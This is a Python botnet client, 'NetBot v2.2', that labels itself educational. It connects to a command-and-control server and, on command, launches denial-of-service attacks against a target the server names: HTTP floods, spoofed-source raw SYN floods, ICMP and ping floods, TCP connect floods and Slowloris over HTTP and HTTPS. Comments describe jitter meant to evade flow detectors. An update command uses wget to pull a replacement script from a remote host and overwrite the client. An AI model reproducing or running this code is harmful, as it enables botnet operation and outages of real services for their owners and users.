#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author: Ahmad Mohammadi
# Tool  : NetBot v2.2 Final Version
# Description: Educational C&C Bot Client

import socket
import threading
import urllib.request
import subprocess
import signal
import os
import time
import random
import select
import string
import struct
import platform
import sys
import ssl

# ====================== Helper Functions ======================

def log_info(msg):
    print(f"[*] {msg}")

def log_success(msg):
    print(f"[+] {msg}")

def log_warning(msg):
    print(f"[!] {msg}")

# ====================== Attack Class ======================

class LaunchAttack:
    def __init__(self):
        self._running = True
        self.workers = []

    def terminate(self):
        self._running = False
        for worker in self.workers:
            if worker.is_alive():
                worker.join(timeout=1)

    def run(self, params):
        try:
            if len(params) < 5:
                log_warning("Received incomplete attack parameters!")
                return

            attack_type = params[3]

            if attack_type == "HTTPFLOOD":
                target_host = params[0]
                target_port = params[1]
                thread_count = int(params[4])

                for _ in range(thread_count):
                    worker = threading.Thread(target=self.http_flood, args=(target_host, target_port))
                    worker.start()
                    self.workers.append(worker)

            elif attack_type == "PINGFLOOD":
                target_host = params[0]
                self.ping_flood(target_host)

            elif attack_type == "TCPSYNFLOOD":
                target_host = params[0]
                target_port = int(params[1])
                pps = int(params[4]) if len(params) > 4 else 100
                worker = threading.Thread(target=self.tcp_syn_flood, args=(target_host, target_port, pps))
                worker.start()
                self.workers.append(worker)

            elif attack_type == "TCPCONNECTFLOOD":
                target_host = params[0]
                target_port = int(params[1])
                thread_count = int(params[4])

                for _ in range(thread_count):
                    worker = threading.Thread(target=self.tcp_connect_flood, args=(target_host, target_port))
                    worker.start()
                    self.workers.append(worker)

            elif attack_type == "ICMPFLOOD":
                target_host = params[0]
                pps = int(params[4]) if len(params) > 4 else 100
                worker = threading.Thread(target=self.icmp_flood, args=(target_host, pps))
                worker.start()
                self.workers.append(worker)
            
            elif attack_type == "SLOWLORIS":
                target_host = params[0]
                target_port = int(params[1])
                sockets = int(params[4]) if len(params) > 4 else 100
                worker = threading.Thread(target=self.slowloris_flood, args=(target_host, target_port, sockets))
                worker.start()
                self.workers.append(worker)

            elif attack_type == "SLOWLORISHTTPS":
                target_host = params[0]
                target_port = int(params[1])
                sockets = int(params[4]) if len(params) > 4 else 100
                worker = threading.Thread(target=self.slowloris_flood_https, args=(target_host, target_port, sockets))
                worker.start()
                self.workers.append(worker)
            
            elif attack_type == "TCPCONNECTFLOODHTTPS":
                target_host = params[0]
                target_port = int(params[1])
                thread_count = int(params[4]) if len(params) > 4 else 20

                for _ in range(thread_count):
                    worker = threading.Thread(target=self.tcp_connect_flood_https, args=(target_host, target_port))
                    worker.start()
                    self.workers.append(worker)


            else:
                log_warning(f"Unknown Attack Type: {attack_type}")

            while self._running:
                time.sleep(1)

        except Exception as e:
            log_warning(f"Attack Error inside run(): {e}")

    import ssl  # at the top of your file, if not already imported

    def http_flood(self, host, port):
        paths = [
            "/", "/index", "/home", "/about", "/contact", "/products", "/products?id=",
            "/news?id=", "/blog", "/faq", "/services", "/support", "/cart", "/login"
        ]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5)",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64)"
        ]
        accept_languages = [
            "en-US,en;q=0.9",
            "en-GB,en;q=0.8",
            "fr-FR,fr;q=0.7,en;q=0.3",
            "de-DE,de;q=0.7,en;q=0.3",
            "es-ES,es;q=0.7,en;q=0.3"
        ]
        post_paths = ["/login", "/register", "/api/contact", "/checkout"]

        while self._running:
            try:
                use_post = random.random() < 0.3  # ~30% POST, rest GET
                is_ssl = str(port) == "443"

                # Random path
                if use_post:
                    path = random.choice(post_paths)
                else:
                    path = random.choice(paths)
                if "?" in path:
                    path += str(random.randint(1, 9999))

                # Random headers
                headers = {
                    "Host": host,
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": random.choice(accept_languages),
                    "Connection": "keep-alive",
                    "Cookie": f"session_id={''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
                }

                # Build HTTP request
                if use_post:
                    post_data = f"username={random.randint(1000,9999)}&password={random.randint(1000,9999)}"
                    request = f"POST {path} HTTP/1.1\r\n"
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    headers["Content-Length"] = str(len(post_data))
                else:
                    request = f"GET {path} HTTP/1.1\r\n"

                for header, value in headers.items():
                    request += f"{header}: {value}\r\n"
                request += "\r\n"
                if use_post:
                    request += post_data

                # Socket setup
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, int(port)))

                if is_ssl:
                    # context = ssl.create_default_context()
                    context = ssl._create_unverified_context()
                    sock = context.wrap_socket(sock, server_hostname=host)

                sock.sendall(request.encode())

                # Follow one redirect if 3xx
                try:
                    response = sock.recv(4096)
                    if b"Location:" in response and b"HTTP/1.1 3" in response:
                        # Optional: parse redirect (not fully robust here)
                        pass
                except:
                    pass

                sock.close()

            except Exception as e:
                log_warning(f"HTTP flood error: {e}")

            time.sleep(random.uniform(0.05, 0.3))  # simulate user pacing


    def tcp_syn_flood(self, target_ip, target_port=80, pps=100):
        """
        Stealth TCP SYN flood using raw sockets with randomization.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            log_warning("Root privileges required for TCP SYN flood!")
            return

        def checksum(data):
            s = 0
            n = len(data) % 2
            for i in range(0, len(data) - n, 2):
                s += (data[i] << 8) + (data[i+1])
            if n:
                s += (data[-1] << 8)
            while s >> 16:
                s = (s & 0xFFFF) + (s >> 16)
            s = ~s & 0xFFFF
            return s

        while self._running:
            try:
                src_ip = f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                src_port = random.randint(1024, 65535)
                ttl = random.randint(50, 128)
                window = random.randint(1000, 65000)

                # IP Header
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    69, 0, 40, random.randint(0, 65535), 0, ttl, socket.IPPROTO_TCP,
                    0, socket.inet_aton(src_ip), socket.inet_aton(target_ip))

                # TCP Header
                tcp_seq = random.randint(0, 4294967295)
                tcp_ack_seq = 0
                offset_res = (5 << 4) + 0
                tcp_flags = 2  # SYN
                tcp_window = window
                tcp_check = 0
                tcp_urg_ptr = 0

                tcp_header = struct.pack('!HHLLBBHHH',
                    src_port, target_port, tcp_seq, tcp_ack_seq,
                    offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

                # Pseudo Header
                pseudo_header = struct.pack('!4s4sBBH',
                    socket.inet_aton(src_ip), socket.inet_aton(target_ip), 0, socket.IPPROTO_TCP, len(tcp_header))
                psh = pseudo_header + tcp_header
                tcp_checksum = checksum(psh)

                # Rebuild TCP header with checksum
                tcp_header = struct.pack('!HHLLBBH',
                    src_port, target_port, tcp_seq, tcp_ack_seq,
                    offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_checksum) + struct.pack('!H', tcp_urg_ptr)

                packet = ip_header + tcp_header

                sock.sendto(packet, (target_ip, 0))

            except Exception as e:
                log_warning(f"TCP SYN flood send error: {e}")

            # Add tiny random jitter to bypass flow detectors
            time.sleep(random.uniform(0.002, 0.01))


    def tcp_connect_flood_https(self, host, port):
        port = int(port)
        while self._running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))

                # Wrap with SSL/TLS
                # context = ssl.create_default_context()
                context = ssl._create_unverified_context()
                ssl_sock = context.wrap_socket(sock, server_hostname=host)

                # Optionally send a small request (looks real)
                try:
                    ssl_sock.send(b"HEAD / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                except Exception as send_error:
                    log_warning(f"HTTPS TCP send error: {send_error}")

                # Close socket
                ssl_sock.close()

            except Exception as conn_error:
                log_warning(f"HTTPS TCP connect error: {conn_error}")
                time.sleep(random.uniform(0.05, 0.2))

    
    def slowloris_flood(self, host, port=80, num_sockets=100, interval=15):
        sockets = []

        def init_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                return s
            except Exception as e:
                log_warning(f"HTTPS Slowloris socket init error: {type(e).__name__} - {e}")
                return None

        # Initialize all sockets
        log_info(f"Creating {num_sockets} sockets for slowloris...")
        for _ in range(num_sockets):
            s = init_socket()
            if s:
                sockets.append(s)

        while self._running:
            log_info(f"Sending keep-alive headers to {len(sockets)} sockets.")
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except Exception:
                    sockets.remove(s)
                    s = init_socket()
                    if s:
                        sockets.append(s)
            time.sleep(interval)

        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass
    

    def slowloris_flood_https(self, host, port=443, num_sockets=100, interval=15):
        sockets = []

        def init_ssl_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))
                context = ssl._create_unverified_context()
                ssl_sock = context.wrap_socket(s, server_hostname=host)
                ssl_sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                ssl_sock.send(f"Host: {host}\r\n".encode())
                ssl_sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                ssl_sock.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                return ssl_sock
            except Exception as e:
                log_warning(f"HTTPS Slowloris socket init error: {e}")
                return None

        # Initialize all sockets
        log_info(f"Creating {num_sockets} HTTPS sockets for slowloris...")
        for _ in range(num_sockets):
            s = init_ssl_socket()
            if s:
                sockets.append(s)

        while self._running:
            log_info(f"Sending keep-alive headers to {len(sockets)} SSL sockets.")
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except Exception:
                    sockets.remove(s)
                    s = init_ssl_socket()
                    if s:
                        sockets.append(s)
            time.sleep(interval)

        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass

    def ping_flood(self, host):
        try:
            if platform.system().lower() == "windows":
                command = f"ping {host} -t"
                pro = subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
            else:
                command = f"ping -f {host}"
                pro = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)

            while self._running:
                time.sleep(1)

            if platform.system().lower() == "windows":
                pro.send_signal(subprocess.signal.CTRL_BREAK_EVENT)
            else:
                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)

        except Exception as e:
            log_warning(f"Ping Flood Error: {e}")

    def tcp_connect_flood(self, host, port):
        port = int(port)
        while self._running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((host, port))
                try:
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                except Exception as send_error:
                    log_warning(f"Send error: {send_error}")
                sock.close()
            except Exception as conn_error:
                log_warning(f"Connect error: {conn_error}")
                time.sleep(random.uniform(0.05, 0.2))

    def icmp_flood(self, target_ip, pps=100, packet_size=64):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except PermissionError:
            log_warning("Root/admin privileges required for raw socket ICMP flood!")
            return

        payload = b'A' * packet_size

        def checksum(data):
            s = 0
            n = len(data) % 2
            for i in range(0, len(data) - n, 2):
                s += (data[i] << 8) + (data[i+1])
            if n:
                s += (data[-1] << 8)
            while s >> 16:
                s = (s & 0xFFFF) + (s >> 16)
            s = ~s & 0xFFFF
            return s

        id_icmp = random.randint(0, 65535)

        while self._running:
            header = struct.pack('!BBHHH', 8, 0, 0, id_icmp, 1)
            chksum = checksum(header + payload)
            header = struct.pack('!BBHHH', 8, 0, chksum, id_icmp, 1)
            packet = header + payload

            try:
                sock.sendto(packet, (target_ip, 1))
            except Exception as e:
                log_warning(f"ICMP flood send error: {e}")

            time.sleep(1 / pps)

        sock.close()

# ====================== Main Client ======================

def main():
    global attack_set
    global updated
    global current_attack
    global attack_thread
    global server_list

    attack_set = 0
    updated = 0
    current_attack = None
    attack_thread = None

    server_list = [
        ('192.168.73.119', 5555),
        # Add more backup servers if needed
    ]

    def connect_ccc():
        global server_list
        random.shuffle(server_list)
        for host, port in server_list:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))
                s.setblocking(False)
                log_success(f"Connected to CCC: {host}:{port}")
                return s
            except Exception as e:
                log_warning(f"Failed to connect to {host}:{port} - {e}")
                time.sleep(2)
        log_warning("All CCC servers failed. Retrying in 30 seconds...")
        time.sleep(30)
        return connect_ccc()

    s = connect_ccc()
    message = "HEARTBEAT"
    last_heartbeat = time.time()

    while True:
        now = time.time()

        # Heartbeat
        if now - last_heartbeat > 10:
            try:
                s.sendall(message.encode())
                log_info("Heartbeat sent.")
            except Exception as e:
                log_warning(f"Heartbeat error: {e}")
                try:
                    s.close()
                except:
                    pass
                s = connect_ccc()
            last_heartbeat = now

        # Check attack health
        if attack_set and attack_thread and not attack_thread.is_alive():
            log_warning("Attack thread crashed! Restarting...")
            attack_set = 0
            if current_attack:
                current_attack.terminate()
                current_attack = None
            time.sleep(2)

        # Handle CCC commands
        try:
            ready_to_read, _, _ = select.select([s], [], [], 0.5)
            if ready_to_read:
                data = s.recv(4096)
                if not data:
                    raise Exception("Server disconnected.")

                data = data.decode()
                commands = data.split('_')

                if len(commands) > 1:
                    att_host, att_port, att_status = commands[0], commands[1], commands[2]
                else:
                    att_status = "OFFLINE"

                log_info(f"CCC Response: {att_status}")

                if att_status == "LAUNCH":
                    if attack_set == 0:
                        attack_set = 1
                        current_attack = LaunchAttack()
                        attack_thread = threading.Thread(target=current_attack.run, args=(commands,))
                        attack_thread.start()
                    else:
                        if attack_thread and attack_thread.is_alive():
                            log_info("Attack already running.")
                        time.sleep(5)

                elif att_status == "HALT":
                    if current_attack:
                        log_info("Halting attack...")
                        current_attack.terminate()
                        if attack_thread:
                            attack_thread.join(timeout=5)
                        current_attack = None
                        attack_thread = None
                    attack_set = 0
                    time.sleep(3)

                elif att_status == "HOLD":
                    if current_attack:
                        log_info("Holding attack...")
                        current_attack.terminate()
                        if attack_thread:
                            attack_thread.join(timeout=5)
                        current_attack = None
                        attack_thread = None
                    attack_set = 0
                    time.sleep(5)

                elif att_status == "UPDATE":
                    if updated == 0:
                        if current_attack:
                            current_attack.terminate()
                            if attack_thread:
                                attack_thread.join(timeout=5)
                            current_attack = None
                            attack_thread = None
                        attack_set = 0
                        os.system('wget -N http://192.168.0.174/netbot_client.py -O netbot_client.py > /dev/null 2>&1')
                        log_success("Client updated.")
                        updated = 1
                    time.sleep(5)

                else:
                    attack_set = 0
                    log_info("Unknown status. Retrying...")
                    time.sleep(5)

        except Exception as e:
            log_warning(f"Socket error: {e}")
            try:
                s.close()
            except:
                pass
            s = connect_ccc()

        time.sleep(0.1)

# ====================== Start Client ======================

if __name__ == "__main__":
    main()
